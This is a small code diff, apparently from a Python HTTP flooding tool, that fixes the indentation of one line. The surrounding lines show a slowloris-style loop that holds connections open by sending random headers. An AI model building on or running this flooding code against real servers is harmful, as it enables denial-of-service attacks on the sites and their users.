@@ -1123,7 +1123,7 @@ class AsyncHttpFlood(HttpFlood):
                 self._stats.track(1, packet_size)
                 await asyncio.wait_for(reader.read(1), timeout=1)
                 for i in range(self._rpc):
-                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     writer.write(keep)
                     await asyncio.wait_for(writer.drain(), timeout=1)
                     self._stats.track(0, len(keep))
